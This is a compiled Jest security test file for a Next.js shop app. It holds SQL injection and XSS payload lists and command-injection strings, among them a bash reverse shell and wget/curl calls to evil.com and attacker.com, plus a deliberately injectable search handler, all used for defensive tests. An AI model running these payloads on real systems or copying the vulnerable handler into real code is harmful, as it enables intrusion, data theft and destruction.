ecf6f8071f400acae2b05b052bc6f129
"use strict";
Object.defineProperty(exports, "__esModule", {
    value: true
});
const _globals = require("@jest/globals");
const _jsonwebtoken = /*#__PURE__*/ _interop_require_default(require("jsonwebtoken"));
const _bcryptjs = /*#__PURE__*/ _interop_require_default(require("bcryptjs"));
function _interop_require_default(obj) {
    return obj && obj.__esModule ? obj : {
        default: obj
    };
}
// Mock NextResponse
const NextResponse = {
    json: (data, init)=>({
            json: async ()=>data,
            status: init?.status || 200,
            headers: new Headers(init?.headers)
        }),
    redirect: (url, status)=>({
            status: status || 302,
            headers: new Headers({
                Location: url
            })
        })
};
// Helper function to create mock NextRequest
const createMockNextRequest = (url, options = {})=>{
    const { method = "GET", body, headers = {} } = options;
    return {
        method,
        url,
        headers: new Headers(headers),
        json: async ()=>body ? typeof body === "string" ? JSON.parse(body) : body : {},
        text: async ()=>body ? typeof body === "string" ? body : JSON.stringify(body) : ""
    };
};
// Security test utilities
class SecurityTestUtils {
    static generateSQLInjectionPayloads() {
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'password'); --",
            "' OR 1=1 --",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "' OR 1=1#"
        ];
    }
    static generateXSSPayloads() {
        return [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        ];
    }
    static generateCommandInjectionPayloads() {
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; cat /etc/shadow",
            "| nc -l 4444",
            "; wget http://evil.com/malware",
            "&& curl http://evil.com/steal-data",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "| bash -i >& /dev/tcp/attacker.com/8080 0>&1",
            "; /bin/bash"
        ];
    }
    static generateLongStrings() {
        return [
            "A".repeat(1000),
            "A".repeat(10000),
            "A".repeat(100000),
            "\0".repeat(1000),
            "\n".repeat(1000),
            "\r".repeat(1000)
        ];
    }
    static generateInvalidTokens() {
        return [
            "invalid.token.here",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
            "",
            "Bearer",
            "null",
            "undefined",
            "{}",
            "admin",
            "../../etc/passwd",
            '<script>alert("xss")</script>'
        ];
    }
    static async hashPassword(password) {
        return _bcryptjs.default.hash(password, 10);
    }
    static generateValidJWT(payload, secret = "test-secret") {
        return _jsonwebtoken.default.sign(payload, secret, {
            expiresIn: "1h"
        });
    }
    static generateExpiredJWT(payload, secret = "test-secret") {
        return _jsonwebtoken.default.sign(payload, secret, {
            expiresIn: "-1h"
        });
    }
}
// Mock API handlers for security testing
const mockPrisma = {
    user: {
        findUnique: jest.fn(),
        findMany: jest.fn(),
        create: jest.fn(),
        update: jest.fn()
    },
    product: {
        findMany: jest.fn(),
        create: jest.fn()
    },
    $queryRaw: jest.fn(),
    $executeRaw: jest.fn()
};
// Mock vulnerable endpoint for testing
const vulnerableSearchHandler = async (req)=>{
    const url = new URL(req.url);
    const query = url.searchParams.get("q");
    if (!query) {
        return NextResponse.json({
            error: "Query required"
        }, {
            status: 400
        });
    }
    // Simulate SQL injection vulnerability (for testing purposes)
    try {
        // This would be vulnerable in real code - DON'T DO THIS
        const results = await mockPrisma.$queryRaw`
      SELECT * FROM products WHERE name LIKE '%${query}%'
    `;
        return NextResponse.json({
            results
        });
    } catch (error) {
        return NextResponse.json({
            error: "Database error"
        }, {
            status: 500
        });
    }
};
// Secure search handler for comparison
const secureSearchHandler = async (req)=>{
    const url = new URL(req.url);
    const query = url.searchParams.get("q");
    if (!query) {
        return NextResponse.json({
            error: "Query required"
        }, {
            status: 400
        });
    }
    // Input validation
    if (query.length > 100) {
        return NextResponse.json({
            error: "Query too long"
        }, {
            status: 400
        });
    }
    // Sanitize input
    const sanitizedQuery = query.replace(/[<>"'&]/g, "");
    try {
        // Use parameterized queries
        const results = await mockPrisma.product.findMany({
            where: {
                name: {
                    contains: sanitizedQuery,
                    mode: "insensitive"
                }
            }
        });
        return NextResponse.json({
            results
        });
    } catch (error) {
        return NextResponse.json({
            error: "Database error"
        }, {
            status: 500
        });
    }
};
// Authentication handler with security measures
const secureAuthHandler = async (req)=>{
    const body = await req.json();
    const { email, password } = body;
    // Rate limiting simulation
    const clientIP = req.headers.get("x-forwarded-for") || "unknown";
    // Input validation
    if (!email || !password) {
        return NextResponse.json({
            error: "Email and password are required"
        }, {
            status: 400
        });
    }
    if (email.length > 254 || password.length > 128) {
        return NextResponse.json({
            error: "Input too long"
        }, {
            status: 400
        });
    }
    // Email format validation
    const emailRegex = /^[a-zA-Z0-9]([a-zA-Z0-9._-]*[a-zA-Z0-9])?@[a-zA-Z0-9]([a-zA-Z0-9.-]*[a-zA-Z0-9])?\.[a-zA-Z]{2,}$/;
    const hasControlChars = /[\x00-\x1F\x7F]/.test(email) || /[\x00-\x1F\x7F]/.test(password);
    const hasConsecutiveDots = /\.{2,}/.test(email);
    if (!emailRegex.test(email) || hasControlChars || hasConsecutiveDots) {
        return NextResponse.json({
            error: "Invalid email format"
        }, {
            status: 400
        });
    }
    // Check for suspicious patterns
    const suspiciousPatterns = [
        /<script/i,
        /javascript:/i,
        /on\w+=/i,
        /\bor\b.*\b1\s*=\s*1\b/i,
        /union.*select/i,
        /drop.*table/i
    ];
    const isSuspicious = suspiciousPatterns.some((pattern)=>pattern.test(email) || pattern.test(password));
    if (isSuspicious) {
        return NextResponse.json({
            error: "Invalid input detected"
        }, {
            status: 400
        });
    }
    try {
        const user = await mockPrisma.user.findUnique({
            where: {
                email
            }
        });
        if (!user) {
            // Constant time delay to prevent timing attacks
            await new Promise((resolve)=>setTimeout(resolve, 100));
            return NextResponse.json({
                error: "Invalid credentials"
            }, {
                status: 401
            });
        }
        const isValid = await _bcryptjs.default.compare(password, user.password);
        if (!isValid) {
            return NextResponse.json({
                error: "Invalid credentials"
            }, {
                status: 401
            });
        }
        // Generate secure token
        const token = _jsonwebtoken.default.sign({
            userId: user.id,
            email: user.email,
            iat: Math.floor(Date.now() / 1000)
        }, "test-secret", {
            expiresIn: "15m",
            issuer: "md-sports",
            audience: "md-sports-client"
        });
        return NextResponse.json({
            user: {
                id: user.id,
                email: user.email,
                name: user.name
            },
            token
        });
    } catch (error) {
        return NextResponse.json({
            error: "Internal server error"
        }, {
            status: 500
        });
    }
};
(0, _globals.describe)("Security Tests", ()=>{
    (0, _globals.beforeAll)(()=>{
        process.env.JWT_SECRET = "test-secret-key-for-security-testing";
    });
    (0, _globals.beforeEach)(()=>{
        jest.clearAllMocks();
    });
    (0, _globals.describe)("SQL Injection Protection", ()=>{
        (0, _globals.it)("should prevent SQL injection in search queries", async ()=>{
            const sqlPayloads = SecurityTestUtils.generateSQLInjectionPayloads();
            for (const payload of sqlPayloads){
                const request = createMockNextRequest(`http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`);
                // Test with secure handler
                const response = await secureSearchHandler(request);
                // Should not return 500 error or expose database structure
                (0, _globals.expect)(response.status).not.toBe(500);
                const data = await response.json();
                (0, _globals.expect)(data).not.toHaveProperty("results");
            }
        });
        (0, _globals.it)("should use parameterized queries", async ()=>{
            mockPrisma.product.findMany.mockResolvedValue([]);
            const request = createMockNextRequest("http://localhost:3000/api/search?q=test' OR '1'='1");
            await secureSearchHandler(request);
            // Verify parameterized query was used
            (0, _globals.expect)(mockPrisma.product.findMany).toHaveBeenCalledWith({
                where: {
                    name: {
                        contains: "test OR 11",
                        mode: "insensitive"
                    }
                }
            });
        });
    });
    (0, _globals.describe)("XSS Protection", ()=>{
        (0, _globals.it)("should sanitize XSS payloads in input", async ()=>{
            const xssPayloads = SecurityTestUtils.generateXSSPayloads();
            for (const payload of xssPayloads){
                const request = createMockNextRequest(`http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`);
                const response = await secureSearchHandler(request);
                const data = await response.json();
                // Should not contain script tags or javascript
                if (data.results) {
                    const responseStr = JSON.stringify(data);
                    (0, _globals.expect)(responseStr).not.toMatch(/<script/i);
                    (0, _globals.expect)(responseStr).not.toMatch(/javascript:/i);
                    (0, _globals.expect)(responseStr).not.toMatch(/on\w+=/i);
                }
            }
        });
        (0, _globals.it)("should reject suspicious input patterns", async ()=>{
            const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: {
                    email: '<script>alert("xss")</script>@test.com',
                    password: "password123"
                },
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const response = await secureAuthHandler(request);
            const data = await response.json();
            (0, _globals.expect)(response.status).toBe(400);
            (0, _globals.expect)(data.error).toBe("Invalid input detected");
        });
    });
    (0, _globals.describe)("Authentication Security", ()=>{
        const testSecret = "test-secret";
        (0, _globals.it)("should reject invalid JWT tokens", async ()=>{
            const invalidTokens = SecurityTestUtils.generateInvalidTokens();
            for (const token of invalidTokens){
                (0, _globals.expect)(()=>{
                    _jsonwebtoken.default.verify(token, testSecret);
                }).toThrow();
            }
        });
        (0, _globals.it)("should reject expired tokens", async ()=>{
            const expiredToken = SecurityTestUtils.generateExpiredJWT({
                userId: 1,
                email: "test@example.com"
            }, testSecret);
            (0, _globals.expect)(()=>{
                _jsonwebtoken.default.verify(expiredToken, testSecret);
            }).toThrow("jwt expired");
        });
        (0, _globals.it)("should use secure password hashing", async ()=>{
            const password = "testpassword123";
            const hash = await SecurityTestUtils.hashPassword(password);
            // Should be bcrypt hash
            (0, _globals.expect)(hash).toMatch(/^\$2[aby]\$\d+\$/);
            // Should not be the original password
            (0, _globals.expect)(hash).not.toBe(password);
            // Should verify correctly
            const isValid = await _bcryptjs.default.compare(password, hash);
            (0, _globals.expect)(isValid).toBe(true);
            // Should not verify with wrong password
            const isInvalid = await _bcryptjs.default.compare("wrongpassword", hash);
            (0, _globals.expect)(isInvalid).toBe(false);
        });
        (0, _globals.it)("should prevent timing attacks in authentication", async ()=>{
            const validEmail = "test@example.com";
            const invalidEmail = "nonexistent@example.com";
            // Mock user lookup
            mockPrisma.user.findUnique.mockImplementation(({ where })=>{
                if (where.email === validEmail) {
                    return Promise.resolve({
                        id: 1,
                        email: validEmail,
                        password: "$2a$10$hashedPassword",
                        name: "Test User"
                    });
                }
                return Promise.resolve(null);
            });
            const validRequest = createMockNextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: {
                    email: validEmail,
                    password: "wrongpassword"
                },
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const invalidRequest = createMockNextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: {
                    email: invalidEmail,
                    password: "wrongpassword"
                },
                headers: {
                    "Content-Type": "application/json"
                }
            });
            // Measure response times
            const start1 = Date.now();
            const response1 = await secureAuthHandler(validRequest);
            const time1 = Date.now() - start1;
            const start2 = Date.now();
            const response2 = await secureAuthHandler(invalidRequest);
            const time2 = Date.now() - start2;
            // Both should return 401
            (0, _globals.expect)(response1.status).toBe(401);
            (0, _globals.expect)(response2.status).toBe(401);
            // Response times should be similar (within 50ms)
            (0, _globals.expect)(Math.abs(time1 - time2)).toBeLessThan(50);
        });
    });
    (0, _globals.describe)("Input Validation", ()=>{
        (0, _globals.it)("should reject oversized inputs", async ()=>{
            const longStrings = SecurityTestUtils.generateLongStrings();
            for (const longString of longStrings){
                const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                    method: "POST",
                    body: {
                        email: longString,
                        password: "password123"
                    },
                    headers: {
                        "Content-Type": "application/json"
                    }
                });
                const response = await secureAuthHandler(request);
                (0, _globals.expect)(response.status).toBe(400);
            }
        });
        (0, _globals.it)("should validate email format", async ()=>{
            const invalidEmails = [
                "invalid-email",
                "@domain.com",
                "user@",
                "user..name@domain.com",
                "user@domain",
                "user name@domain.com"
            ];
            // Test empty email separately as it triggers a different error
            const emptyEmailRequest = createMockNextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: {
                    email: "",
                    password: "password123"
                },
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const emptyEmailResponse = await secureAuthHandler(emptyEmailRequest);
            const emptyEmailData = await emptyEmailResponse.json();
            (0, _globals.expect)(emptyEmailResponse.status).toBe(400);
            (0, _globals.expect)(emptyEmailData.error).toBe("Email and password are required");
            for (const email of invalidEmails){
                const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                    method: "POST",
                    body: {
                        email,
                        password: "password123"
                    },
                    headers: {
                        "Content-Type": "application/json"
                    }
                });
                const response = await secureAuthHandler(request);
                const data = await response.json();
                (0, _globals.expect)(response.status).toBe(400);
                (0, _globals.expect)(data.error).toBe("Invalid email format");
            }
        });
        (0, _globals.it)("should handle null bytes and special characters", async ()=>{
            const maliciousInputs = [
                "test\0@example.com",
                "test\r\n@example.com",
                "test	@example.com",
                "test\b@example.com"
            ];
            for (const input of maliciousInputs){
                const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                    method: "POST",
                    body: {
                        email: input,
                        password: "password123"
                    },
                    headers: {
                        "Content-Type": "application/json"
                    }
                });
                const response = await secureAuthHandler(request);
                (0, _globals.expect)(response.status).toBe(400);
            }
        });
    });
    (0, _globals.describe)("Command Injection Protection", ()=>{
        (0, _globals.it)("should prevent command injection in file operations", ()=>{
            const commandPayloads = SecurityTestUtils.generateCommandInjectionPayloads();
            for (const payload of commandPayloads){
                // Simulate file name validation
                const isValidFileName = (filename)=>{
                    // Only allow alphanumeric, dots, hyphens, and underscores
                    return /^[a-zA-Z0-9._-]+$/.test(filename);
                };
                (0, _globals.expect)(isValidFileName(payload)).toBe(false);
            }
        });
    });
    (0, _globals.describe)("JWT Security", ()=>{
        const testSecret = "test-secret";
        (0, _globals.it)("should use secure JWT configuration", ()=>{
            const payload = {
                userId: 1,
                email: "test@example.com"
            };
            const secret = "test-secret";
            const token = SecurityTestUtils.generateValidJWT(payload, secret);
            const decoded = _jsonwebtoken.default.verify(token, secret);
            (0, _globals.expect)(decoded.userId).toBe(1);
            (0, _globals.expect)(decoded.email).toBe("test@example.com");
            (0, _globals.expect)(decoded.iat).toBeDefined();
            (0, _globals.expect)(decoded.exp).toBeDefined();
        });
        (0, _globals.it)("should not accept tokens with none algorithm", ()=>{
            // Create a token with 'none' algorithm (security vulnerability)
            const header = Buffer.from(JSON.stringify({
                alg: "none",
                typ: "JWT"
            })).toString("base64url");
            const payload = Buffer.from(JSON.stringify({
                userId: 1,
                email: "test@example.com"
            })).toString("base64url");
            const noneToken = `${header}.${payload}.`;
            (0, _globals.expect)(()=>{
                _jsonwebtoken.default.verify(noneToken, testSecret);
            }).toThrow();
        });
        (0, _globals.it)("should validate token signature", ()=>{
            const validToken = SecurityTestUtils.generateValidJWT({
                userId: 1
            }, testSecret);
            const [header, payload, signature] = validToken.split(".");
            const tamperedToken = `${header}.${payload}.tampered_signature`;
            (0, _globals.expect)(()=>{
                _jsonwebtoken.default.verify(tamperedToken, testSecret);
            }).toThrow("invalid signature");
        });
    });
    (0, _globals.describe)("Rate Limiting Simulation", ()=>{
        (0, _globals.it)("should handle rapid successive requests", async ()=>{
            const requests = Array.from({
                length: 100
            }, ()=>createMockNextRequest("http://localhost:3000/api/auth/login", {
                    method: "POST",
                    body: {
                        email: "test@example.com",
                        password: "password123"
                    },
                    headers: {
                        "Content-Type": "application/json",
                        "X-Forwarded-For": "192.168.1.100"
                    }
                }));
            // In a real implementation, this would trigger rate limiting
            const responses = await Promise.all(requests.map((req)=>secureAuthHandler(req)));
            // All requests should be processed (in real app, some would be rate limited)
            responses.forEach((response)=>{
                (0, _globals.expect)([
                    400,
                    401,
                    429
                ]).toContain(response.status); // 429 = Too Many Requests
            });
        });
    });
    (0, _globals.describe)("Error Handling Security", ()=>{
        (0, _globals.it)("should not expose sensitive information in error messages", async ()=>{
            // Simulate database error
            mockPrisma.user.findUnique.mockRejectedValue(new Error('Connection failed to database "md_sports" on host "localhost"'));
            const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: {
                    email: "test@example.com",
                    password: "password123"
                },
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const response = await secureAuthHandler(request);
            const data = await response.json();
            (0, _globals.expect)(response.status).toBe(500);
            (0, _globals.expect)(data.error).toBe("Internal server error");
            (0, _globals.expect)(data.error).not.toContain("database");
            (0, _globals.expect)(data.error).not.toContain("localhost");
            (0, _globals.expect)(data.error).not.toContain("md_sports");
        });
        (0, _globals.it)("should use generic error messages for authentication failures", async ()=>{
            mockPrisma.user.findUnique.mockResolvedValue(null);
            const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: {
                    email: "nonexistent@example.com",
                    password: "password123"
                },
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const response = await secureAuthHandler(request);
            const data = await response.json();
            (0, _globals.expect)(response.status).toBe(401);
            (0, _globals.expect)(data.error).toBe("Invalid credentials");
            (0, _globals.expect)(data.error).not.toContain("user not found");
            (0, _globals.expect)(data.error).not.toContain("email");
        });
    });
});

//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy9zYWNoaW4vRG9jdW1lbnRzL21kLXNwb3J0cy0vdGVzdHMvc2VjdXJpdHkvc2VjdXJpdHkudGVzdC50cyJdLCJzb3VyY2VzQ29udGVudCI6WyJpbXBvcnQgeyBkZXNjcmliZSwgaXQsIGV4cGVjdCwgYmVmb3JlQWxsLCBhZnRlckFsbCwgYmVmb3JlRWFjaCB9IGZyb20gJ0BqZXN0L2dsb2JhbHMnO1xuaW1wb3J0IGp3dCBmcm9tICdqc29ud2VidG9rZW4nO1xuaW1wb3J0IGJjcnlwdCBmcm9tICdiY3J5cHRqcyc7XG5pbXBvcnQgY3J5cHRvIGZyb20gJ2NyeXB0byc7XG5cbi8vIE1vY2sgTmV4dFJlc3BvbnNlXG5jb25zdCBOZXh0UmVzcG9uc2UgPSB7XG4gIGpzb246IChkYXRhOiBhbnksIGluaXQ/OiBSZXNwb25zZUluaXQpID0+ICh7XG4gICAganNvbjogYXN5bmMgKCkgPT4gZGF0YSxcbiAgICBzdGF0dXM6IGluaXQ/LnN0YXR1cyB8fCAyMDAsXG4gICAgaGVhZGVyczogbmV3IEhlYWRlcnMoaW5pdD8uaGVhZGVycyksXG4gIH0pLFxuICByZWRpcmVjdDogKHVybDogc3RyaW5nLCBzdGF0dXM/OiBudW1iZXIpID0+ICh7XG4gICAgc3RhdHVzOiBzdGF0dXMgfHwgMzAyLFxuICAgIGhlYWRlcnM6IG5ldyBIZWFkZXJzKHsgTG9jYXRpb246IHVybCB9KSxcbiAgfSksXG59O1xuXG4vLyBIZWxwZXIgZnVuY3Rpb24gdG8gY3JlYXRlIG1vY2sgTmV4dFJlcXVlc3RcbmNvbnN0IGNyZWF0ZU1vY2tOZXh0UmVxdWVzdCA9ICh1cmw6IHN0cmluZywgb3B0aW9uczoge1xuICBtZXRob2Q/OiBzdHJpbmc7XG4gIGJvZHk/OiBhbnk7XG4gIGhlYWRlcnM/OiBSZWNvcmQ8c3RyaW5nLCBzdHJpbmc+O1xufSA9IHt9KTogYW55ID0+IHtcbiAgY29uc3QgeyBtZXRob2QgPSAnR0VUJywgYm9keSwgaGVhZGVycyA9IHt9IH0gPSBvcHRpb25zO1xuICByZXR1cm4ge1xuICAgIG1ldGhvZCxcbiAgICB1cmwsXG4gICAgaGVhZGVyczogbmV3IEhlYWRlcnMoaGVhZGVycyksXG4gICAganNvbjogYXN5bmMgKCkgPT4gYm9keSA/ICh0eXBlb2YgYm9keSA9PT0gJ3N0cmluZycgPyBKU09OLnBhcnNlKGJvZHkpIDogYm9keSkgOiB7fSxcbiAgICB0ZXh0OiBhc3luYyAoKSA9PiBib2R5ID8gKHR5cGVvZiBib2R5ID09PSAnc3RyaW5nJyA/IGJvZHkgOiBKU09OLnN0cmluZ2lmeShib2R5KSkgOiAnJyxcbiAgfTtcbn07XG5cbi8vIFNlY3VyaXR5IHRlc3QgdXRpbGl0aWVzXG5jbGFzcyBTZWN1cml0eVRlc3RVdGlscyB7XG4gIHN0YXRpYyBnZW5lcmF0ZVNRTEluamVjdGlvblBheWxvYWRzKCk6IHN0cmluZ1tdIHtcbiAgICByZXR1cm4gW1xuICAgICAgXCInOyBEUk9QIFRBQkxFIHVzZXJzOyAtLVwiLFxuICAgICAgXCInIE9SICcxJz0nMVwiLFxuICAgICAgXCInIFVOSU9OIFNFTEVDVCAqIEZST00gdXNlcnMgLS1cIixcbiAgICAgIFwiJzsgSU5TRVJUIElOVE8gdXNlcnMgKGVtYWlsLCBwYXNzd29yZCkgVkFMVUVTICgnaGFja2VyQGV2aWwuY29tJywgJ3Bhc3N3b3JkJyk7IC0tXCIsXG4gICAgICBcIicgT1IgMT0xIC0tXCIsXG4gICAgICBcImFkbWluJy0tXCIsXG4gICAgICBcImFkbWluJy8qXCIsXG4gICAgICBcIicgT1IgJ3gnPSd4XCIsXG4gICAgICBcIicpIE9SICgnMSc9JzFcIixcbiAgICAgIFwiJyBPUiAxPTEjXCIsXG4gICAgXTtcbiAgfVxuXG4gIHN0YXRpYyBnZW5lcmF0ZVhTU1BheWxvYWRzKCk6IHN0cmluZ1tdIHtcbiAgICByZXR1cm4gW1xuICAgICAgXCI8c2NyaXB0PmFsZXJ0KCdYU1MnKTwvc2NyaXB0PlwiLFxuICAgICAgXCJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKVwiLFxuICAgICAgXCI8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoJ1hTUycpPlwiLFxuICAgICAgXCI8c3ZnIG9ubG9hZD1hbGVydCgnWFNTJyk+XCIsXG4gICAgICBcIjxpZnJhbWUgc3JjPWphdmFzY3JpcHQ6YWxlcnQoJ1hTUycpPjwvaWZyYW1lPlwiLFxuICAgICAgXCI8Ym9keSBvbmxvYWQ9YWxlcnQoJ1hTUycpPlwiLFxuICAgICAgXCI8aW5wdXQgb25mb2N1cz1hbGVydCgnWFNTJykgYXV0b2ZvY3VzPlwiLFxuICAgICAgXCI8c2VsZWN0IG9uZm9jdXM9YWxlcnQoJ1hTUycpIGF1dG9mb2N1cz5cIixcbiAgICAgIFwiPHRleHRhcmVhIG9uZm9jdXM9YWxlcnQoJ1hTUycpIGF1dG9mb2N1cz5cIixcbiAgICAgIFwiPGtleWdlbiBvbmZvY3VzPWFsZXJ0KCdYU1MnKSBhdXRvZm9jdXM+XCIsXG4gICAgXTtcbiAgfVxuXG4gIHN0YXRpYyBnZW5lcmF0ZUNvbW1hbmRJbmplY3Rpb25QYXlsb2FkcygpOiBzdHJpbmdbXSB7XG4gICAgcmV0dXJuIFtcbiAgICAgIFwiOyBscyAtbGFcIixcbiAgICAgIFwifCBjYXQgL2V0Yy9wYXNzd2RcIixcbiAgICAgIFwiJiYgcm0gLXJmIC9cIixcbiAgICAgIFwiOyBjYXQgL2V0Yy9zaGFkb3dcIixcbiAgICAgIFwifCBuYyAtbCA0NDQ0XCIsXG4gICAgICBcIjsgd2dldCBodHRwOi8vZXZpbC5jb20vbWFsd2FyZVwiLFxuICAgICAgXCImJiBjdXJsIGh0dHA6Ly9ldmlsLmNvbS9zdGVhbC1kYXRhXCIsXG4gICAgICBcIjsgcHl0aG9uIC1jICdpbXBvcnQgb3M7IG9zLnN5c3RlbShcXFwicm0gLXJmIC9cXFwiKSdcIixcbiAgICAgIFwifCBiYXNoIC1pID4mIC9kZXYvdGNwL2F0dGFja2VyLmNvbS84MDgwIDA+JjFcIixcbiAgICAgIFwiOyAvYmluL2Jhc2hcIixcbiAgICBdO1xuICB9XG5cbiAgc3RhdGljIGdlbmVyYXRlTG9uZ1N0cmluZ3MoKTogc3RyaW5nW10ge1xuICAgIHJldHVybiBbXG4gICAgICAnQScucmVwZWF0KDEwMDApLFxuICAgICAgJ0EnLnJlcGVhdCgxMDAwMCksXG4gICAgICAnQScucmVwZWF0KDEwMDAwMCksXG4gICAgICAnXFx4MDAnLnJlcGVhdCgxMDAwKSwgLy8gTnVsbCBieXRlc1xuICAgICAgJ1xcbicucmVwZWF0KDEwMDApLCAvLyBOZXdsaW5lc1xuICAgICAgJ1xccicucmVwZWF0KDEwMDApLCAvLyBDYXJyaWFnZSByZXR1cm5zXG4gICAgXTtcbiAgfVxuXG4gIHN0YXRpYyBnZW5lcmF0ZUludmFsaWRUb2tlbnMoKTogc3RyaW5nW10ge1xuICAgIHJldHVybiBbXG4gICAgICAnaW52YWxpZC50b2tlbi5oZXJlJyxcbiAgICAgICdleUpoYkdjaU9pSklVekkxTmlJc0luUjVjQ0k2SWtwWFZDSjkuaW52YWxpZC5zaWduYXR1cmUnLFxuICAgICAgJycsIC8vIEVtcHR5IHRva2VuXG4gICAgICAnQmVhcmVyJywgLy8gSnVzdCBCZWFyZXJcbiAgICAgICdudWxsJyxcbiAgICAgICd1bmRlZmluZWQnLFxuICAgICAgJ3t9JyxcbiAgICAgICdhZG1pbicsXG4gICAgICAnLi4vLi4vZXRjL3Bhc3N3ZCcsXG4gICAgICAnPHNjcmlwdD5hbGVydChcInhzc1wiKTwvc2NyaXB0PicsXG4gICAgXTtcbiAgfVxuXG4gIHN0YXRpYyBhc3luYyBoYXNoUGFzc3dvcmQocGFzc3dvcmQ6IHN0cmluZyk6IFByb21pc2U8c3RyaW5nPiB7XG4gICAgcmV0dXJuIGJjcnlwdC5oYXNoKHBhc3N3b3JkLCAxMCk7XG4gIH1cblxuICBzdGF0aWMgZ2VuZXJhdGVWYWxpZEpXVChwYXlsb2FkOiBhbnksIHNlY3JldDogc3RyaW5nID0gJ3Rlc3Qtc2VjcmV0Jyk6IHN0cmluZyB7XG4gICAgcmV0dXJuIGp3dC5zaWduKHBheWxvYWQsIHNlY3JldCwgeyBleHBpcmVzSW46ICcxaCcgfSk7XG4gIH1cblxuICBzdGF0aWMgZ2VuZXJhdGVFeHBpcmVkSldUKHBheWxvYWQ6IGFueSwgc2VjcmV0OiBzdHJpbmcgPSAndGVzdC1zZWNyZXQnKTogc3RyaW5nIHtcbiAgICByZXR1cm4gand0LnNpZ24ocGF5bG9hZCwgc2VjcmV0LCB7IGV4cGlyZXNJbjogJy0xaCcgfSk7XG4gIH1cbn1cblxuLy8gTW9jayBBUEkgaGFuZGxlcnMgZm9yIHNlY3VyaXR5IHRlc3RpbmdcbmNvbnN0IG1vY2tQcmlzbWEgPSB7XG4gIHVzZXI6IHtcbiAgICBmaW5kVW5pcXVlOiBqZXN0LmZuKCksXG4gICAgZmluZE1hbnk6IGplc3QuZm4oKSxcbiAgICBjcmVhdGU6IGplc3QuZm4oKSxcbiAgICB1cGRhdGU6IGplc3QuZm4oKSxcbiAgfSxcbiAgcHJvZHVjdDoge1xuICAgIGZpbmRNYW55OiBqZXN0LmZuKCksXG4gICAgY3JlYXRlOiBqZXN0LmZuKCksXG4gIH0sXG4gICRxdWVyeVJhdzogamVzdC5mbigpLFxuICAkZXhlY3V0ZVJhdzogamVzdC5mbigpLFxufTtcblxuLy8gTW9jayB2dWxuZXJhYmxlIGVuZHBvaW50IGZvciB0ZXN0aW5nXG5jb25zdCB2dWxuZXJhYmxlU2VhcmNoSGFuZGxlciA9IGFzeW5jIChyZXE6IE5leHRSZXF1ZXN0KSA9PiB7XG4gIGNvbnN0IHVybCA9IG5ldyBVUkwocmVxLnVybCk7XG4gIGNvbnN0IHF1ZXJ5ID0gdXJsLnNlYXJjaFBhcmFtcy5nZXQoJ3EnKTtcbiAgXG4gIGlmICghcXVlcnkpIHtcbiAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oeyBlcnJvcjogJ1F1ZXJ5IHJlcXVpcmVkJyB9LCB7IHN0YXR1czogNDAwIH0pO1xuICB9XG5cbiAgLy8gU2ltdWxhdGUgU1FMIGluamVjdGlvbiB2dWxuZXJhYmlsaXR5IChmb3IgdGVzdGluZyBwdXJwb3NlcylcbiAgdHJ5IHtcbiAgICAvLyBUaGlzIHdvdWxkIGJlIHZ1bG5lcmFibGUgaW4gcmVhbCBjb2RlIC0gRE9OJ1QgRE8gVEhJU1xuICAgIGNvbnN0IHJlc3VsdHMgPSBhd2FpdCBtb2NrUHJpc21hLiRxdWVyeVJhd2BcbiAgICAgIFNFTEVDVCAqIEZST00gcHJvZHVjdHMgV0hFUkUgbmFtZSBMSUtFICclJHtxdWVyeX0lJ1xuICAgIGA7XG4gICAgXG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKHsgcmVzdWx0cyB9KTtcbiAgfSBjYXRjaCAoZXJyb3IpIHtcbiAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oeyBlcnJvcjogJ0RhdGFiYXNlIGVycm9yJyB9LCB7IHN0YXR1czogNTAwIH0pO1xuICB9XG59O1xuXG4vLyBTZWN1cmUgc2VhcmNoIGhhbmRsZXIgZm9yIGNvbXBhcmlzb25cbmNvbnN0IHNlY3VyZVNlYXJjaEhhbmRsZXIgPSBhc3luYyAocmVxOiBOZXh0UmVxdWVzdCkgPT4ge1xuICBjb25zdCB1cmwgPSBuZXcgVVJMKHJlcS51cmwpO1xuICBjb25zdCBxdWVyeSA9IHVybC5zZWFyY2hQYXJhbXMuZ2V0KCdxJyk7XG4gIFxuICBpZiAoIXF1ZXJ5KSB7XG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKHsgZXJyb3I6ICdRdWVyeSByZXF1aXJlZCcgfSwge